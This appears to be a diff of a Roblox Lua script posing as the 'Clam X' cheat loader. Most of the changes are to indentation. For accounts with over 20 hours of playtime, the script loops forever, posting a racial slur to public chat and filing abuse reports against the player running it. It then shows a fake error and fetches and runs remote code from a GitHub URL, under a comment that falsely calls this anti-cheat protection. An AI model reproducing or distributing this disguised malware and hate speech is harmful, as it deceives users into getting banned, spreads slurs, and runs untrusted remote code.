@@ -6,14 +6,13 @@ local pt = pd:WaitForChild("PlayTime")
 local ptdata = pt.Value
 
 if ptdata < 72000 then
-game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Account must have over 20 hours of playtime!")
+	game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Account must have over 20 hours of playtime!")
 else
-		while true do
-			Game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FUCK NIGGERS", "All")
-			game.Players:ReportAbuse(game.Players.lp, "swearing", "HE SAID FUCK BAN THIS NIGGER")
-		end
+	while true do
+		Game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FUCK NIGGERS", "All")
+		game.Players:ReportAbuse(game.Players.lp, "swearing", "HE SAID FUCK BAN THIS NIGGER")
+	end
 	game:GetService("ReplicatedStorage").Events.Note:Fire("Clam X", "Error: Contact DictatorDrip#3463 for help")
 
 	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DictatorDrip/CLAM-X/main/CLAM"))() --Anti Cheat cheese, don't remove this unless you want anti cheat to ban you lmao
-	end
-end)
+end
